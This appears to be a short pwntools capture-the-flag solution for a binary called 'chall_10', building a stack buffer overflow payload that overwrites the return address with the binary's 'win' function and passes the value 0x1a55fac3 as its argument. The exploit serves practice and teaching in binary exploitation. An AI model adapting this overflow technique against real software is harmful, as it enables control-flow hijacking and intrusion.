# coding: utf-8
from pwn import *
pr = process("./chall_10")
elf = ELF("./chall_10")
add_1 = (0x308)
add_2 = (0x1a55fac3)
payload = b'A' * (add_1) + b'A' * 4 + p32(elf.sym.win) + b'A' * 4 + p32(add_2)
pr.sendline(payload)
pr.interactive()
pr.close()
